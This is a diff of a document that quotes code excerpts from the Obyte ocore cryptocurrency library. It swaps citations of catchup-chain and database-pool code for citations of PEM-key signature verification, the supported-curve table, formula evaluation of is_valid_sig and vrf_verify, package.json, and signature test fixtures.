-					if (objBall.ball !== objectHash.getBallHash(objBall.unit, objBall.parent_balls, objBall.skiplist_balls, objBall.is_nonserial))
-						return callbacks.ifError("wrong ball hash: unit "+objBall.unit+", ball "+objBall.ball);
-					if (!assocKnownBalls[objBall.ball])
-						return callbacks.ifError("ball not known: "+objBall.ball+', unit='+objBall.unit+', i='+i+', unstable: '+catchupChain.unstable_mc_joints.map(function(j){ return j.unit.unit }).join(', ')+', arrLastBallUnits '+arrLastBallUnits.join(', '));
-					objBall.parent_balls.forEach(function(parent_ball){
-						assocKnownBalls[parent_ball] = true;
-					});
-					if (objBall.skiplist_balls)
-						objBall.skiplist_balls.forEach(function(skiplist_ball){
-							assocKnownBalls[skiplist_ball] = true;
-						});
-				}
-				assocKnownBalls = null; // free memory
-				var objEarliestProofchainBall = catchupChain.proofchain_balls[catchupChain.proofchain_balls.length - 1];
-				var last_ball_unit = objEarliestProofchainBall.unit;
-				var last_ball = objEarliestProofchainBall.ball;
-			}
+function verifyMessageWithPemPubKey(message, signature, pem_key) {
+	var verify = crypto.createVerify('SHA256');
+	verify.update(message);
+	verify.end();
+	var encoding = ValidationUtils.isValidHexadecimal(signature) ? 'hex' : 'base64';
+	try {
+		return verify.verify(pem_key, signature, encoding);
+	} catch(e1) {
+		try {
+			if (e1 instanceof TypeError)
+				return verify.verify({key: pem_key}, signature, encoding); // from Node v11, the key has to be included in an object 
 			else{
-				var objFirstStableJoint = catchupChain.stable_last_ball_joints[0];
-				var objFirstStableUnit = objFirstStableJoint.unit;
-				if (arrLastBallUnits.indexOf(objFirstStableUnit.unit) === -1)
-					return callbacks.ifError("first stable unit is not last ball unit of any unstable unit");
-				var last_ball_unit = objFirstStableUnit.unit;
-				var last_ball = assocLastBallByLastBallUnit[last_ball_unit];
-				if (objFirstStableJoint.ball !== last_ball)
-					return callbacks.ifError("last ball and last ball unit do not match: "+objFirstStableJoint.ball+"!=="+last_ball);
+				console.log("exception when verifying with pem key: " + e1);
+				return false;
 			}
-			
-			// stable joints
-			var arrChainBalls = [];
-			for (var i=0; i<catchupChain.stable_last_ball_joints.length; i++){
-				var objJoint = catchupChain.stable_last_ball_joints[i];
-				var objUnit = objJoint.unit;
-				if (!objJoint.ball)
-					return callbacks.ifError("stable but no ball");
-				if (!validation.hasValidHashes(objJoint))
-					return callbacks.ifError("invalid hash");
-				if (objUnit.unit !== last_ball_unit)
-					return callbacks.ifError("not the last ball unit");
-				if (objJoint.ball !== last_ball)
-					return callbacks.ifError("not the last ball");
-				if (objUnit.last_ball_unit){
-					last_ball_unit = objUnit.last_ball_unit;
-					last_ball = objUnit.last_ball;
-				}
-				arrChainBalls.push(objJoint.ball);
-			}
-			arrChainBalls.reverse();
+		} catch(e2) {
+			console.log("exception when verifying with pem key: " + e1 + " " + e2);
+			return false;
+		}
+	}
+}
+```
 
+**File:** signature.js (L140-141)
+```javascript
+	if (!objSupportedPemTypes[typeIdentifiersHex])
+		return handle("unsupported algo or curve in pem key");
+```
 
-			var unlock = null;
-			async.series([
-				function(cb){
-					mutex.lock(["catchup_chain"], function(_unlock){
-						unlock = _unlock;
-						db.query("SELECT 1 FROM catchup_chain_balls LIMIT 1", function(rows){
-							(rows.length > 0) ? cb("duplicate") : cb();
+**File:** signature.js (L160-350)
+```javascript
+var objSupportedPemTypes = {
+	'06072a8648ce3d020106092b2403030208010101': {
+		name: 'brainpoolP160r1',
+		hex_pub_key_length: 80,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106092b2403030208010102': {
+		name: 'brainpoolP160t1',
+		hex_pub_key_length: 80,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106092b2403030208010103': {
+		name: 'brainpoolP192r1',
+		hex_pub_key_length: 96,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106092b2403030208010104': {
+		name: 'brainpoolP192t1',
+		hex_pub_key_length: 96,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106092b2403030208010105': {
+		name: 'brainpoolP224r1',
+		hex_pub_key_length: 112,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106092b2403030208010106': {
+		name: 'brainpoolP224t1',
+		hex_pub_key_length: 112,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106092b2403030208010107': {
+		name: 'brainpoolP256r1',
+		hex_pub_key_length: 128,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106092b2403030208010108': {
+		name: 'brainpoolP256t1',
+		hex_pub_key_length: 128,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106082a8648ce3d030101': {
+		name: 'prime192v1',
+		hex_pub_key_length: 96,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106082a8648ce3d030102': {
+		name: 'prime192v2',
+		hex_pub_key_length: 96,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106082a8648ce3d030103': {
+		name: 'prime192v3',
+		hex_pub_key_length: 96,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106082a8648ce3d030104': {
+		name: 'prime239v1',
+		hex_pub_key_length: 120,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106082a8648ce3d030105': {
+		name: 'prime239v2',
+		hex_pub_key_length: 120,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106082a8648ce3d030106': {
+		name: 'prime239v3',
+		hex_pub_key_length: 120,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106082a8648ce3d030107': {
+		name: 'prime256v1',
+		hex_pub_key_length: 128,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040006': {
+		name: 'secp112r1',
+		hex_pub_key_length: 56,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040007': {
+		name: 'secp112r2',
+		hex_pub_key_length: 56,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b8104001c': {
+		name: 'secp128r1',
+		hex_pub_key_length: 64,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b8104001d': {
+		name: 'secp128r2',
+		hex_pub_key_length: 64,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040009': {
+		name: 'secp160k1',
+		hex_pub_key_length: 80,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040008': {
+		name: 'secp160r1',
+		hex_pub_key_length: 80,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b8104001e': {
+		name: 'secp160r2',
+		hex_pub_key_length: 80,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b8104001f': {
+		name: 'secp192k1',
+		hex_pub_key_length: 96,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040020': {
+		name: 'secp224k1',
+		hex_pub_key_length: 112,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040021': {
+		name: 'secp224r1',
+		hex_pub_key_length: 112,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b8104000a': {
+		name: 'secp256k1',
+		hex_pub_key_length: 128,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040022': {
+		name: 'secp384r1',
+		hex_pub_key_length: 192,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040004': {
+		name: 'sect113r1',
+		hex_pub_key_length: 60,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040005': {
+		name: 'sect113r2',
+		hex_pub_key_length: 60,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040016': {
+		name: 'sect131r1',
+		hex_pub_key_length: 68,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d020106052b81040017': {
+		name: 'sect131r2',
+		hex_pub_key_length: 68,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d02010605672b010401': {
+		name: 'wap-wsg-idm-ecid-wtls1',
+		hex_pub_key_length: 60,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d02010605672b010404': {
+		name: 'wap-wsg-idm-ecid-wtls4',
+		hex_pub_key_length: 60,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d02010605672b010406': {
+		name: 'wap-wsg-idm-ecid-wtls6',
+		hex_pub_key_length: 56,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d02010605672b010407': {
+		name: 'wap-wsg-idm-ecid-wtls7',
+		hex_pub_key_length: 80,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d02010605672b010408': {
+		name: 'wap-wsg-idm-ecid-wtls8',
+		hex_pub_key_length: 56,
+		algo: 'ECDSA'
+	},
+	'06072a8648ce3d02010605672b010409': {
+		name: 'wap-wsg-idm-ecid-wtls9',
+		hex_pub_key_length: 80,
+		algo: 'ECDSA'
+	},
+	'06092a864886f70d0101010500':{
+		name: 'PKCS #1',
+		algo: 'RSA'
+	}
+};
+```
+
+**File:** formula/evaluation.js (L1581-1611)
+```javascript
+			case 'is_valid_sig':
+				var message = arr[1];
+				var pem_key = arr[2];
+				var sig = arr[3];
+				evaluate(message, function (evaluated_message) {
+					if (fatal_error)
+						return cb(false);
+					if (!ValidationUtils.isNonemptyString(evaluated_message))
+						return setFatalError("bad message string in is_valid_sig", cb, false);
+					evaluate(sig, function (evaluated_signature) {
+						if (fatal_error)
+							return cb(false);
+						if (!ValidationUtils.isNonemptyString(evaluated_signature))
+							return setFatalError("bad signature string in is_valid_sig", cb, false);
+						if (evaluated_signature.length > 1024)
+							return setFatalError("signature is too large", cb, false);
+						if (!ValidationUtils.isValidHexadecimal(evaluated_signature) && !ValidationUtils.isValidBase64(evaluated_signature))
+							return setFatalError("bad signature string in is_valid_sig", cb, false);
+						evaluate(pem_key, function (evaluated_pem_key) {
+							if (fatal_error)
+								return cb(false);
+							signature.validateAndFormatPemPubKey(evaluated_pem_key, "any", function (error, formatted_pem_key){
+								if (error)
+									return setFatalError("bad PEM key in is_valid_sig: " + error, cb, false);
+								var result = signature.verifyMessageWithPemPubKey(evaluated_message, evaluated_signature, formatted_pem_key);
+								return cb(result);
+							});
 						});
 					});
-				},
-				function(cb){ // adjust first chain ball if necessary and make sure it is the only stable unit in the entire chain
-					db.query(
-						"SELECT is_stable, is_on_main_chain, main_chain_index FROM balls JOIN units USING(unit) WHERE ball=?", 
-						[arrChainBalls[0]], 
-						function(rows){
-							if (rows.length === 0){
-								if (storage.isGenesisBall(arrChainBalls[0]))
-									return cb();
-								return cb("first chain ball "+arrChainBalls[0]+" is not known");
-							}
-							var objFirstChainBallProps = rows[0];
-							if (objFirstChainBallProps.is_stable !== 1)
-								return cb("first chain ball "+arrChainBalls[0]+" is not stable");
-							if (objFirstChainBallProps.is_on_main_chain !== 1)
-								return cb("first chain ball "+arrChainBalls[0]+" is not on mc");
-							storage.readLastStableMcUnitProps(db, function(objLastStableMcUnitProps){
-								var last_stable_mci = objLastStableMcUnitProps.main_chain_index;
-								if (objFirstChainBallProps.main_chain_index > last_stable_mci) // duplicate check
-									return cb("first chain ball "+arrChainBalls[0]+" mci is too large");
-								if (objFirstChainBallProps.main_chain_index === last_stable_mci) // exact match
-									return cb();
-								arrChainBalls[0] = objLastStableMcUnitProps.ball; // replace to avoid receiving duplicates
-								if (!arrChainBalls[1])
-									return cb();
-								db.query("SELECT is_stable FROM balls JOIN units USING(unit) WHERE ball=?", [arrChainBalls[1]], function(rows2){
-									if (rows2.length === 0)
-										return cb();
-									var objSecondChainBallProps = rows2[0];
-									if (objSecondChainBallProps.is_stable === 1)
-										return cb("second chain ball "+arrChainBalls[1]+" must not be stable");
-									cb();
-								});
-							});
-						}
-					);
-				},
-				function(cb){ // validation complete, now write the chain for future downloading of hash trees
-					var arrValues = arrChainBalls.map(function(ball){ return "("+db.escape(ball)+")"; });
-					db.query("INSERT INTO catchup_chain_balls (ball) VALUES "+arrValues.join(', '), function(){
-						cb();
-					});
-				}
-			], function(err){
-				unlock();
-				err ? callbacks.ifError(err) : callbacks.ifOk();
-			});
-
-		}
-	);
-}
-```
-
-**File:** catchup.js (L256-334)
-```javascript
-function readHashTree(hashTreeRequest, callbacks){
-	if (!hashTreeRequest)
-		return callbacks.ifError("no hash tree request");
-	var from_ball = hashTreeRequest.from_ball;
-	var to_ball = hashTreeRequest.to_ball;
-	if (typeof from_ball !== 'string')
-		return callbacks.ifError("no from_ball");
-	if (typeof to_ball !== 'string')
-		return callbacks.ifError("no to_ball");
-	var start_ts = Date.now();
-	var from_mci;
-	var to_mci;
-	db.query(
-		"SELECT is_stable, is_on_main_chain, main_chain_index, ball FROM balls JOIN units USING(unit) WHERE ball IN(?,?)", 
-		[from_ball, to_ball], 
-		function(rows){
-			if (rows.length !== 2)
-				return callbacks.ifError("some balls not found");
-			for (var i=0; i<rows.length; i++){
-				var props = rows[i];
-				if (props.is_stable !== 1)
-					return callbacks.ifError("some balls not stable");
-				if (props.is_on_main_chain !== 1)
-					return callbacks.ifError("some balls not on mc");
-				if (props.ball === from_ball)
-					from_mci = props.main_chain_index;
-				else if (props.ball === to_ball)
-					to_mci = props.main_chain_index;
-			}
-			if (from_mci >= to_mci)
-				return callbacks.ifError("from is after to");
-			var arrBalls = [];
-			var op = (from_mci === 0) ? ">=" : ">"; // if starting from 0, add genesis itself
-			db.query(
-				"SELECT unit, ball, content_hash FROM units LEFT JOIN balls USING(unit) \n\
-				WHERE main_chain_index "+op+" ? AND main_chain_index<=? ORDER BY main_chain_index, `level`", 
-				[from_mci, to_mci], 
-				function(ball_rows){
-					async.eachSeries(
-						ball_rows,
-						function(objBall, cb){
-							if (!objBall.ball)
-								throw Error("no ball for unit "+objBall.unit);
-							if (objBall.content_hash)
-								objBall.is_nonserial = true;
-							delete objBall.content_hash;
-							db.query(
-								"SELECT ball FROM parenthoods LEFT JOIN balls ON parent_unit=balls.unit WHERE child_unit=? ORDER BY ball", 
-								[objBall.unit],
-								function(parent_rows){
-									if (parent_rows.some(function(parent_row){ return !parent_row.ball; }))
-										throw Error("some parents have no balls");
-									if (parent_rows.length > 0)
-										objBall.parent_balls = parent_rows.map(function(parent_row){ return parent_row.ball; });
-									db.query(
-										"SELECT ball FROM skiplist_units LEFT JOIN balls ON skiplist_unit=balls.unit WHERE skiplist_units.unit=? ORDER BY ball", 
-										[objBall.unit],
-										function(srows){
-											if (srows.some(function(srow){ return !srow.ball; }))
-												throw Error("some skiplist units have no balls");
-											if (srows.length > 0)
-												objBall.skiplist_balls = srows.map(function(srow){ return srow.ball; });
-											arrBalls.push(objBall);
-											cb();
-										}
-									);
-								}
-							);
-						},
-						function(){
-							console.log("readHashTree for "+JSON.stringify(hashTreeRequest)+" took "+(Date.now()-start_ts)+'ms');
-							callbacks.ifOk(arrBalls);
-						}
-					);
-				}
-			);
-		}
-	);
-}
-```
-
-**File:** sqlite_pool.js (L74-82)
-```javascript
-			release: function(){
-				//console.log("released connection");
-				this.bInUse = false;
-				if (arrQueue.length === 0)
-					return;
-				var connectionHandler = arrQueue.shift();
-				this.bInUse = true;
-				connectionHandler(this);
-			},
-```
-
-**File:** sqlite_pool.js (L194-223)
-```javascript
-	function takeConnectionFromPool(handleConnection){
-
-		if (!handleConnection)
-			return new Promise(resolve => takeConnectionFromPool(resolve));
-
-		if (!bReady){
-			console.log("takeConnectionFromPool will wait for ready");
-			eventEmitter.once('ready', function(){
-				console.log("db is now ready");
-				takeConnectionFromPool(handleConnection);
-			});
-			return;
-		}
-		
-		// first, try to find a free connection
-		for (var i=0; i<arrConnections.length; i++)
-			if (!arrConnections[i].bInUse){
-				//console.log("reusing previously opened connection");
-				arrConnections[i].bInUse = true;
-				return handleConnection(arrConnections[i]);
-			}
-
-		// second, try to open a new connection
-		if (arrConnections.length < MAX_CONNECTIONS)
-			return connect(handleConnection);
-
-		// third, queue it
-		//console.log("queuing");
-		arrQueue.push(handleConnection);
-	}
-```
-
-**File:** writer.js (L36-52)
-```javascript
-	function initConnection(handleConnection) {
-		if (bInLargerTx) {
-			profiler.start();
-			commit_fn = function (sql, cb) { cb(); };
-			return handleConnection(objValidationState.conn);
-		}
-		db.takeConnectionFromPool(function (conn) {
-			profiler.start();
-			conn.addQuery(arrQueries, "BEGIN");
-			commit_fn = function (sql, cb) {
-				conn.query(sql, function () {
-					cb();
 				});
-			};
-			handleConnection(conn);
-		});
-	}
+				break;
+```
+
+**File:** formula/evaluation.js (L1613-1643)
+```javascript
+			case 'vrf_verify':
+				var seed = arr[1];
+				var proof = arr[2];
+				var pem_key = arr[3];
+				evaluate(seed, function (evaluated_seed) {
+					if (fatal_error)
+						return cb(false);
+					if (!ValidationUtils.isNonemptyString(evaluated_seed))
+						return setFatalError("bad seed in vrf_verify", cb, false);
+					evaluate(proof, function (evaluated_proof) {
+						if (fatal_error)
+							return cb(false);
+						if (!ValidationUtils.isNonemptyString(evaluated_proof))
+							return setFatalError("bad proof string in vrf_verify", cb, false);
+						if (evaluated_proof.length > 1024)
+							return setFatalError("proof is too large", cb, false);
+						if (!ValidationUtils.isValidHexadecimal(evaluated_proof))
+							return setFatalError("bad signature string in vrf_verify", cb, false);
+						evaluate(pem_key, function (evaluated_pem_key) {
+							if (fatal_error)
+								return cb(false);
+							signature.validateAndFormatPemPubKey(evaluated_pem_key, "RSA", function (error, formatted_pem_key){
+								if (error)
+									return setFatalError("bad PEM key in vrf_verify: " + error, cb, false);
+								var result = signature.verifyMessageWithPemPubKey(evaluated_seed, evaluated_proof, formatted_pem_key);
+								return cb(result);
+							});
+						});
+					});
+				});
+				break;
+```
+
+**File:** package.json (L1-56)
+```json
+{
+  "name": "ocore",
+  "description": "Obyte Core",
+  "author": "Obyte",
+  "version": "0.4.2",
+  "keywords": [
+    "obyte",
+    "byteball",
+    "DAG",
+    "DLT",
+    "cryptocurrency",
+    "blockchain",
+    "smart contract",
+    "multisignature"
+  ],
+  "homepage": "https://github.com/byteball/ocore",
+  "license": "MIT",
+  "repository": {
+    "url": "git://github.com/byteball/ocore.git",
+    "type": "git"
+  },
+  "bugs": {
+    "url": "https://github.com/byteball/ocore/issues"
+  },
+  "browser": {
+    "request": "browser-request",
+    "secp256k1": "secp256k1/elliptic"
+  },
+  "dependencies": {
+    "async": "^2.6.1",
+    "decimal.js": "^10.0.2",
+    "bitcore-mnemonic": "~1.0.0",
+    "dotenv": "5.0.1",
+    "https-proxy-agent": "^7.0.6",
+    "socks-proxy-agent": "^8.0.5",
+    "jszip": "^3.1.3",
+    "level-rocksdb": "^5",
+    "lodash": "^4.6.1",
+    "moo": "0.5.1",
+    "mysql": "^2.10.2",
+    "nearley": "2.16.0",
+    "nodemailer": "^6.7.0",
+    "secp256k1": "^4",
+    "sqlite3": "^5",
+    "thirty-two": "^1.0.1",
+    "ws": "^8.18.1"
+  },
+  "scripts": {
+    "test": "yarn ava --timeout=60s --concurrency=1 --fail-fast --verbose",
+    "compileGrammar:oscript": "nearleyc ./formula/grammars/oscript.ne -o ./formula/grammars/oscript.js",
+    "compileGrammar:ojson": "nearleyc ./formula/grammars/ojson.ne -o ./formula/grammars/ojson.js"
+  },
+  "devDependencies": {
+    "ava": "^0.22.0",
+    "testcheck": "^1.0.0-rc.2"
+  }
+```
+
+**File:** test/pem_sig.test.js (L250-260)
+```javascript
+
+test.cb('is_valid_sig prime192v2', t => {
+	var trigger = { data: 
+	{
+		pem_key: "-----BEGIN PUBLIC KEY-----\n\
+MEkwEwYHKoZIzj0CAQYIKoZIzj0DAQIDMgAEUv/XMkZQAh6raybe5eUSZslEQHa2\n\
+hF0aQX7GEzIUaf6U+tcCxH0vA98NJruvNSo6\n\
+-----END PUBLIC KEY-----\n\
+",
+		message: "GrR8t8sUxWoZTA==",
+		signature: "3035021900d6f10143fdd2663e607005e63946d3f8b06fc5506853b32502183f1b991abf1dd88b2be604db0439070eb190e663f3e0d4c2"}
+```
+
+**File:** test/pem_sig.test.js (L1537-1558)
+```javascript
+test.cb('sign message with prime192v2', t => {
+	var trigger = {
+		data: 
+			{
+				pem_key: "-----BEGIN PUBLIC KEY-----\n\
+MEkwEwYHKoZIzj0CAQYIKoZIzj0DAQIDMgAE+cdmDQMfo0cDKxgMb4SmRNRVPTmu\n\
+zrD/csOZa8imuV8EI1sgXxHmYbGVLd2CYHAX\n\
+-----END PUBLIC KEY-----",
+				message: "j/+vyqkq3j/uHA==",
+				signature: asymSig.signMessageWithEcPemPrivKey("j/+vyqkq3j/uHA==", null, "-----BEGIN EC PRIVATE KEY-----\n\
+MF8CAQEEGDp4GFvvPaVsmRx+k55cfTasmBfN4MGqnaAKBggqhkjOPQMBAqE0AzIA\n\
+BPnHZg0DH6NHAysYDG+EpkTUVT05rs6w/3LDmWvIprlfBCNbIF8R5mGxlS3dgmBw\n\
+Fw==\n\
+-----END EC PRIVATE KEY-----")
+			}
+	};
+	t.deepEqual(!!trigger.data.signature, true);
+	evalFormulaWithVars({ conn: null, formula:  "is_valid_sig(trigger.data.message, trigger.data.pem_key, trigger.data.signature)", trigger: trigger, objValidationState: objValidationState, address: 'MXMEKGN37H5QO2AWHT7XRG6LHJVVTAWU' }, (res, complexity) => {
+		t.deepEqual(res, true);
+		t.deepEqual(complexity, 2);
+		t.end();
+	})
 ```
